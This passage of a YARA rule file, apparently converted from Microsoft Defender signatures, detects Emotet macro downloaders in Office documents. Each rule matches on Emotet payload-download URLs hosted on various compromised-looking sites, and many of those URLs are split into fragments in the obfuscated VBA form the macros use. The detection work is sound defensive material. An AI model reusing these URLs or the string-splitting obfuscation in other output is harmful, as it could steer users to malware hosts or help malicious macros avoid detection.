        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VPD!MTB"
        threat_id = "2147817340"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://congtycamvinh.com/plugins/jG3iqpQaTL1TXYMolH/" ascii //weight: 1
        $x_1_2 = "://ecube.com.mx/e2oCWBnC/6wp2K4sfQmVIRy6ZvdiH/" ascii //weight: 1
        $x_1_3 = "://dulichdichvu.net/libraries/6vhzwoZoNDSMtSC/" ascii //weight: 1
        $x_1_4 = "://gnif.org/administrator/G68HwUGlKNJNU2vh5cz/" ascii //weight: 1
        $x_1_5 = "://edoraseguros.com.br/cgi-bin/l7ZERv5deNsfzlZUZ/" ascii //weight: 1
        $x_1_6 = "://sanoma.allrent.nl/cgi-bin/KXbI5OhLJ/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALV_2147817402_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALV!MTB"
        threat_id = "2147817402"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "fpd.cl/cgi-bin/83E0xgTMc/" ascii //weight: 1
        $x_1_2 = "el-energiaki.gr/wp-content/plugins/really-simple-ssl/testssl/serverport443/WUV5PJA/" ascii //weight: 1
        $x_1_3 = "www.manchesterslt.co.uk/a-to-z-of-slt/Ntrci3Ry/" ascii //weight: 1
        $x_1_4 = "contactworks.nl/layouts/fFxKZabh/" ascii //weight: 1
        $x_1_5 = "baykusoglu.com.tr/wp-admin/Y3sRBcOfZ34wg2sO/" ascii //weight: 1
        $x_1_6 = "ceibadiseno.com.mx/brochure/kBuNjsECS9y2gRB6xaC/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VBSM_2147817844_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VBSM!MTB"
        threat_id = "2147817844"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "o\"&\"1/0c\"&\"Jp\"&\"UJ\"&\"XB\"&\"hu\"&\"Ba\"&\"Md\"&\"VW\"&\"Qf/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_VBSM_2147817844_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.VBSM!MTB"
        threat_id = "2147817844"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "farschid.de/verkaufsberater_service/ozrw36a2y1ch2cluzy/" ascii //weight: 1
        $x_1_2 = "77homolog.com.br/dev-jealves/gp55wbynxnp6/" ascii //weight: 1
        $x_1_3 = "geowf.ge/templates/pjrea3iu3wg/" ascii //weight: 1
        $x_1_4 = "h63402x4.beget.tech/bin/wl0enie3bhelxv6v/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_WPD_2147818545_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.WPD!MTB"
        threat_id = "2147818545"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://easiercommunications.com/wp-content/w/" ascii //weight: 1
        $x_1_2 = "://dulichdichvu.net/libraries/QhtrjCZymLp5EbqOdpKk/" ascii //weight: 1
        $x_1_3 = "://www.whow.fr/wp-includes/H54Fgj0tG/" ascii //weight: 1
        $x_1_4 = "://genccagdas.com.tr/assets/TTHOm833iNn3BxT/" ascii //weight: 1
        $x_1_5 = "://heaventechnologies.com.pk/apitest/xdeAU0rx26LT9I/" ascii //weight: 1
        $x_1_6 = "://goonboy.com/goonie/bSFz7Av/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PKEE_2147818635_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PKEE!MTB"
        threat_id = "2147818635"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "jimlowry.com/9tag/Mv2ZYY61NBOf8/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_XPD_2147818672_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.XPD!MTB"
        threat_id = "2147818672"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://i\"&\"nd\"&\"iab\"&\"io.i\"&\"n/w\"&\"e\"&\"b/i\"&\"t_f\"&\"or\"&\"m\"&\"s/j\"&\"vO\"&\"Hu\"&\"tv\"&\"DT\"&\"3p\"&\"d/" ascii //weight: 1
        $x_1_2 = "://w\"&\"w\"&\"w.in\"&\"du\"&\"str\"&\"ia\"&\"sg\"&\"ui\"&\"d\"&\"i.c\"&\"o\"&\"m.a\"&\"r/w\"&\"p-i\"&\"nc\"&\"lud\"&\"e\"&\"s/x9\"&\"18\"&\"PG\"&\"FU/" ascii //weight: 1
        $x_1_3 = "://in\"&\"ge\"&\"ni\"&\"ou\"&\"s.c\"&\"l/c\"&\"g\"&\"i-b\"&\"i\"&\"n/P\"&\"LC\"&\"xj\"&\"gK\"&\"9C\"&\"rM\"&\"AH\"&\"D2\"&\"Ri/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_YPD_2147818673_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.YPD!MTB"
        threat_id = "2147818673"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/h\"&\"os\"&\"t\"&\"al-alf\"&\"on\"&\"s\"&\"o1\"&\"2.c\"&\"om/c\"&\"la\"&\"s\"&\"es/S\"&\"Kt\"&\"Pv\"&\"v/" ascii //weight: 1
        $x_1_2 = ":/\"&\"/ho\"&\"we\"&\"si\"&\"tg\"&\"oi\"&\"n\"&\"g.c\"&\"om/i\"&\"ma\"&\"ge\"&\"s/H\"&\"ya\"&\"Dn\"&\"lb\"&\"l6\"&\"K7\"&\"tb\"&\"h2\"&\"Lu\"&\"gy\"&\"s/" ascii //weight: 1
        $x_1_3 = ":/\"&\"/ww\"&\"w.jd\"&\"se\"&\"rr\"&\"alh\"&\"e\"&\"ri\"&\"a.c\"&\"o\"&\"m.b\"&\"r/c\"&\"g\"&\"i-b\"&\"in/K\"&\"F\"&\"G\"&\"6/" ascii //weight: 1
        $x_1_4 = "://in\"&\"t\"&\"ei\"&\"ra\"&\"do.c\"&\"o\"&\"m.b\"&\"r/f\"&\"on\"&\"ts/7\"&\"dJ\"&\"CV\"&\"vu\"&\"E5\"&\"x3\"&\"Yr\"&\"GQ\"&\"s2\"&\"oJ\"&\"z/" ascii //weight: 1
        $x_1_5 = ":/\"&\"/ic\"&\"ie\"&\"e.un\"&\"ti\"&\"rt\"&\"a.a\"&\"c.i\"&\"d/t\"&\"es\"&\"t/G\"&\"cc\"&\"R\"&\"w/" ascii //weight: 1
        $x_1_6 = ":/\"&\"/id\"&\"e\"&\"os\"&\"o.c\"&\"o\"&\"m.t\"&\"w/c\"&\"g\"&\"i-b\"&\"i\"&\"n/zL\"&\"rn\"&\"Bd\"&\"2E\"&\"g1\"&\"N3\"&\"UV\"&\"y5\"&\"yL/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ARA_2147818726_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ARA!MTB"
        threat_id = "2147818726"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "w\"&\"w\"&\"w.fl\"&\"as\"&\"h-i\"&\"n\"&\"c.c\"&\"om/g\"&\"ro\"&\"up/i\"&\"gi\"&\"rl/c\"&\"ss/Q\"&\"qo\"&\"V" ascii //weight: 1
        $x_1_2 = "ip\"&\"ab\"&\"og\"&\"ad\"&\"os.c\"&\"l/j\"&\"s/h\"&\"hH\"&\"W8\"&\"Cl\"&\"D2\"&\"j7\"&\"sY\"&\"cS\"&\"kN\"&\"u" ascii //weight: 1
        $x_1_3 = "ho\"&\"sp\"&\"it\"&\"al\"&\"d\"&\"si\"&\"tg\"&\"es.c\"&\"a\"&\"t/O\"&\"L\"&\"D_BO\"&\"RR\"&\"AR/c\"&\"eC\"&\"C6\"&\"SP\"&\"Mu\"&\"e" ascii //weight: 1
        $x_1_4 = "j\"&\"an\"&\"la.d\"&\"k/I\"&\"nd\"&\"ex_h\"&\"tm_fi\"&\"le\"&\"s/H\"&\"l/\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ZPD_2147818747_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ZPD!MTB"
        threat_id = "2147818747"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/w\"&\"if\"&\"i.h\"&\"ot\"&\"sp\"&\"ot.mg/j\"&\"s/x\"&\"e7\"&\"0z\"&\"w8/" ascii //weight: 1
        $x_1_2 = ":/\"&\"/ik\"&\"at\"&\"em\"&\"ia.u\"&\"nt\"&\"ir\"&\"ta.a\"&\"c.i\"&\"d/a\"&\"s\"&\"se\"&\"ts/V\"&\"T/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EOPK_2147818760_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EOPK!MTB"
        threat_id = "2147818760"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "t\"&\"tp://w\"&\"w\"&\"w.is\"&\"ma\"&\"rt\"&\"te\"&\"ch\"&\"no\"&\"lo\"&\"gi\"&\"es.c\"&\"o\"&\"m/b\"&\"lo\"&\"gs/L\"&\"jC\"&\"TI\"&\"tL\"&\"tH\"&\"GB\"&\"M4\"&\"S3/" ascii //weight: 1
        $x_1_2 = "t\"&\"t\"&\"p:/\"&\"/an\"&\"gu\"&\"ia\"&\"no\"&\"ss.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/b\"&\"LM\"&\"H9\"&\"Q3\"&\"bG/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EEPK_2147818762_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EEPK!MTB"
        threat_id = "2147818762"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "t\"&\"t\"&\"p://s\"&\"al\"&\"le\"&\"de\"&\"mo\"&\"de.c\"&\"o\"&\"m/t\"&\"gr\"&\"ou\"&\"p.g\"&\"e/k\"&\"I1\"&\"nx\"&\"jD\"&\"Ar\"&\"zg\"&\"lO\"&\"LC\"&\"Zk\"&\"5/" ascii //weight: 1
        $x_1_2 = "t\"&\"tp\"&\"s://b\"&\"os\"&\"ny.c\"&\"o\"&\"m/a\"&\"sp\"&\"ne\"&\"t_cl\"&\"ie\"&\"nt/k\"&\"WX\"&\"KD\"&\"qs\"&\"BE\"&\"iP\"&\"vG/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AEPD_2147818845_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AEPD!MTB"
        threat_id = "2147818845"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://i\"&\"lri\"&\"p\"&\"ar\"&\"at\"&\"ut\"&\"to.e\"&\"u/t\"&\"m\"&\"p/0K\"&\"1Nu\"&\"py\"&\"KP\"&\"eX/" ascii //weight: 1
        $x_1_2 = "://c\"&\"ub\"&\"ice\"&\"gg.a\"&\"s\"&\"ia/p\"&\"KU\"&\"VQ\"&\"sf\"&\"SH\"&\"B/c\"&\"f\"&\"F/" ascii //weight: 1
        $x_1_3 = "://d\"&\"rv\"&\"in\"&\"ici\"&\"ust\"&\"er\"&\"ra.c\"&\"o\"&\"m.b\"&\"r/w\"&\"p-a\"&\"dm\"&\"in/Z\"&\"8T\"&\"84\"&\"Txc\"&\"RX\"&\"Pi\"&\"99/" ascii //weight: 1
        $x_1_4 = "://h\"&\"qs\"&\"is\"&\"te\"&\"ma\"&\"s.co\"&\"m.a\"&\"r/c\"&\"g\"&\"i-b\"&\"in/F\"&\"MP\"&\"TF\"&\"Cp/" ascii //weight: 1
        $x_1_5 = "://ji\"&\"m\"&\"mym\"&\"eri\"&\"da.i\"&\"m\"&\"d.c\"&\"o\"&\"m.b\"&\"o/c\"&\"g\"&\"i-b\"&\"in/k9\"&\"Cn\"&\"l0\"&\"bk/" ascii //weight: 1
        $x_1_6 = "://c\"&\"ei\"&\"ba\"&\"dis\"&\"en\"&\"o.c\"&\"o\"&\"m.m\"&\"x/br\"&\"oc\"&\"h\"&\"ur\"&\"e/h\"&\"nZjH\"&\"Go\"&\"1E\"&\"YIT\"&\"QZ/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AAPD_2147818863_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AAPD!MTB"
        threat_id = "2147818863"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ":/\"&\"/w\"&\"w\"&\"w.ju\"&\"n\"&\"i\"&\"pe\"&\"rn.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"in/u\"&\"G/" ascii //weight: 1
        $x_1_2 = "://w\"&\"w\"&\"w.m\"&\"e\"&\"g\"&\"ak\"&\"o\"&\"n\"&\"fe\"&\"ra\"&\"ns.c\"&\"o\"&\"m/w\"&\"p-a\"&\"d\"&\"m\"&\"in/Z\"&\"1\"&\"m\"&\"o8\"&\"dE\"&\"i01/" ascii //weight: 1
        $x_1_3 = "://w\"&\"w\"&\"w.m\"&\"iv\"&\"ar\"&\"ia.c\"&\"o\"&\"m/o\"&\"w\"&\"l-c\"&\"ar\"&\"o\"&\"u\"&\"s\"&\"e\"&\"l/p\"&\"Q\"&\"N\"&\"0l\"&\"5\"&\"0\"&\"E\"&\"2\"&\"w\"&\"T\"&\"jQ\"&\"E4\"&\"0q\"&\"gc\"&\"I/" ascii //weight: 1
        $x_1_4 = "://w\"&\"w\"&\"w.m\"&\"jh\"&\"l.c\"&\"o\"&\"m.m\"&\"x/f\"&\"o\"&\"n\"&\"ts/s\"&\"G/" ascii //weight: 1
        $x_1_5 = "://m\"&\"a\"&\"p\"&\"li\"&\"n.h\"&\"u/fi\"&\"l\"&\"l\"&\"e\"&\"r/6\"&\"H\"&\"V\"&\"0\"&\"9N\"&\"x\"&\"m\"&\"s\"&\"4\"&\"J\"&\"V\"&\"g\"&\"u\"&\"H\"&\"W\"&\"X\"&\"x/" ascii //weight: 1
        $x_1_6 = "://m\"&\"a\"&\"n\"&\"a\"&\"g\"&\"e\"&\"pl\"&\"u\"&\"s.n\"&\"l/a\"&\"p\"&\"i/Y\"&\"f3\"&\"8\"&\"v\"&\"e\"&\"p\"&\"A\"&\"o\"&\"h\"&\"f\"&\"S\"&\"kk\"&\"Mp\"&\"ky/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ABPD_2147818865_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ABPD!MTB"
        threat_id = "2147818865"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://w\"&\"w\"&\"w.ma\"&\"la\"&\"mu\"&\"rt\"&\"hy\"&\"ca\"&\"te\"&\"ri\"&\"ng.c\"&\"o\"&\"m/fo\"&\"nt/s\"&\"r1\"&\"9M\"&\"fe\"&\"wP\"&\"Up\"&\"kl\"&\"fV\"&\"o/" ascii //weight: 1
        $x_1_2 = "://m\"&\"or\"&\"ei\"&\"ra\"&\"ca\"&\"st\"&\"ro.c\"&\"o\"&\"m/E\"&\"sp\"&\"eci\"&\"al\"&\"id\"&\"ad\"&\"es/n\"&\"pX\"&\"Zz\"&\"4Z/" ascii //weight: 1
        $x_1_3 = "://m\"&\"rs\"&\"gi\"&\"gg\"&\"le\"&\"s.c\"&\"o\"&\"m/w\"&\"p-in\"&\"cl\"&\"ud\"&\"es/z\"&\"B2\"&\"9l\"&\"3l\"&\"gR/" ascii //weight: 1
        $x_1_4 = "://m\"&\"or\"&\"ell\"&\"ah\"&\"ai\"&\"r.c\"&\"o\"&\"m/P\"&\"HP\"&\"Ma\"&\"ile\"&\"r/6\"&\"0/" ascii //weight: 1
        $x_1_5 = "://m\"&\"or\"&\"tst\"&\"er.n\"&\"et/i\"&\"ma\"&\"ge\"&\"s/f\"&\"hu\"&\"G9\"&\"UG\"&\"VB\"&\"x/" ascii //weight: 1
        $x_1_6 = "://o\"&\"cc2\"&\".iva\"&\"o.a\"&\"er\"&\"o/i\"&\"n\"&\"t/TYR\"&\"el3\"&\"iD6\"&\"zB\"&\"Ldc\"&\"eH\"&\"Au/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EHPK_2147818886_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EHPK!MTB"
        threat_id = "2147818886"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "t\"&\"t\"&\"p://m\"&\"pm\"&\"hi\"&\"no.c\"&\"o\"&\"m/m\"&\"od\"&\"ul\"&\"es/z\"&\"Dg\"&\"2\"&\"I50\"&\"UV\"&\"Sj\"&\"om\"&\"72\"&\"Yr\"&\"u5\"&\"v/" ascii //weight: 1
        $x_1_2 = "t\"&\"tp\"&\"://m\"&\"os\"&\"bi\"&\"re\"&\"so\"&\"ur\"&\"ce\"&\"s.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"in/b\"&\"Tu\"&\"pw\"&\"38\"&\"RZ\"&\"Hx\"&\"XK\"&\"2W\"&\"eb\"&\"41/" ascii //weight: 1
        $x_1_3 = "t\"&\"tp\"&\"s://w\"&\"w\"&\"w.m\"&\"ast\"&\"el\"&\"ec\"&\"om.c\"&\"l/q7\"&\"cj\"&\"v6\"&\"lG\"&\"OS/o\"&\"/" ascii //weight: 1
        $x_1_4 = "t\"&\"tp\"&\"://m\"&\"oy\"&\"na\"&\"n.c\"&\"o\"&\"m/s\"&\"ex\"&\"ma\"&\"tt\"&\"er\"&\"s.e\"&\"u/m\"&\"Qb\"&\"tY\"&\"GG/" ascii //weight: 1
        $x_1_5 = "t\"&\"t\"&\"p://w\"&\"w\"&\"w.l\"&\"ak\"&\"or.c\"&\"h/la\"&\"ko\"&\"r/u\"&\"41t\"&\"ai\"&\"mP/" ascii //weight: 1
        $x_1_6 = "t\"&\"tp://w\"&\"w\"&\"w.m\"&\"et\"&\"al\"&\"ga\"&\"s.c\"&\"o\"&\"m.a\"&\"r/w\"&\"p-in\"&\"clu\"&\"de\"&\"s/2E\"&\"co\"&\"bg/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ACPD_2147818893_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ACPD!MTB"
        threat_id = "2147818893"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://m\"&\"ic\"&\"r\"&\"o\"&\"le\"&\"n\"&\"t.c\"&\"o\"&\"m/a\"&\"d\"&\"m\"&\"i\"&\"n/G\"&\"go\"&\"C/" ascii //weight: 1
        $x_1_2 = "://m\"&\"is\"&\"si\"&\"ss\"&\"au\"&\"g\"&\"a\"&\"ta\"&\"xi.c\"&\"o\"&\"m/w\"&\"p-ad\"&\"m\"&\"i\"&\"n/K\"&\"Vo\"&\"Ci\"&\"Q\"&\"w\"&\"gj\"&\"rt\"&\"a\"&\"v\"&\"e\"&\"i\"&\"4x/" ascii //weight: 1
        $x_1_3 = ":/\"&\"/m\"&\"iv\"&\"ar\"&\"i\"&\"a.c\"&\"o\"&\"m/o\"&\"w\"&\"l-c\"&\"a\"&\"r\"&\"o\"&\"us\"&\"el/E\"&\"6p\"&\"K\"&\"F\"&\"Pl\"&\"Gu\"&\"UW\"&\"3/" ascii //weight: 1
        $x_1_4 = "://w\"&\"w\"&\"w.m\"&\"ob\"&\"il\"&\"h\"&\"o\"&\"n\"&\"d\"&\"ab\"&\"a\"&\"n\"&\"du\"&\"ng.n\"&\"e\"&\"t/s\"&\"st\"&\"i/y\"&\"Yr\"&\"vm\"&\"Jg\"&\"jp\"&\"FH\"&\"He/" ascii //weight: 1
        $x_1_5 = ":/\"&\"/e\"&\"la\"&\"m\"&\"u\"&\"rr\"&\"a\"&\"y.c\"&\"o\"&\"m/c\"&\"g\"&\"i-b\"&\"i\"&\"n/s\"&\"Pg\"&\"G8\"&\"g/" ascii //weight: 1
        $x_1_6 = "://m\"&\"g\"&\"m\"&\"e\"&\"u\"&\"r\"&\"o\"&\"p\"&\"e.s\"&\"k/d\"&\"w\"&\"l/r\"&\"r\"&\"q\"&\"U\"&\"9\"&\"X\"&\"Y\"&\"Az\"&\"g\"&\"A\"&\"V\"&\"n\"&\"eY\"&\"O\"&\"h\"&\"I/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ADPD_2147818937_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ADPD!MTB"
        threat_id = "2147818937"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.libcus.com/wp-admin/uY9Sq81cqNw1MM/" ascii //weight: 1
        $x_1_2 = "://kronostr.com/tr/bbRjEuBFYBX4Oiod/" ascii //weight: 1
        $x_1_3 = "://kuluckaci.com/yarisma/cgi-bin/obEPv40iNRumhPGv6wo/" ascii //weight: 1
        $x_1_4 = "://lightindustry.tv/Jeremy/9veI7/" ascii //weight: 1
        $x_1_5 = "://lisadavie.com/6lGBHkyJ3WoI5/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AGPD_2147818946_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AGPD!MTB"
        threat_id = "2147818946"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://k\"&\"elt\"&\"on\"&\"co\"&\"ns\"&\"tr\"&\"uc\"&\"ti\"&\"on.c\"&\"o\"&\"m/_v\"&\"ti_bi\"&\"n/D\"&\"FN\"&\"or\"&\"q/" ascii //weight: 1
        $x_1_2 = "://w\"&\"w\"&\"w.jo\"&\"n\"&\"h\"&\"ra\"&\"ch.c\"&\"o\"&\"m/V\"&\"2/5\"&\"pi\"&\"sN\"&\"b\"&\"ar\"&\"rV\"&\"m/" ascii //weight: 1
        $x_1_3 = "://j\"&\"ud\"&\"y.g\"&\"ot\"&\"ch\"&\"ah\"&\"os\"&\"ti\"&\"ng.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/h\"&\"MZ\"&\"t/" ascii //weight: 1
        $x_1_4 = "://j\"&\"oy\"&\"aa\"&\"rg\"&\"en\"&\"t.c\"&\"l/as\"&\"se\"&\"ts/A\"&\"Ug\"&\"Gy\"&\"Jg\"&\"rA\"&\"7G\"&\"GK\"&\"ro\"&\"QQ\"&\"p/" ascii //weight: 1
        $x_1_5 = "://lu\"&\"mine\"&\"sth\"&\"em\"&\"es.c\"&\"o\"&\"m/c\"&\"lo\"&\"ne_c\"&\"on\"&\"tr\"&\"ol\"&\"le\"&\"r/b\"&\"Kv\"&\"5L\"&\"EL\"&\"dg\"&\"zG\"&\"Rh\"&\"tV\"&\"Ai\"&\"J/" ascii //weight: 1
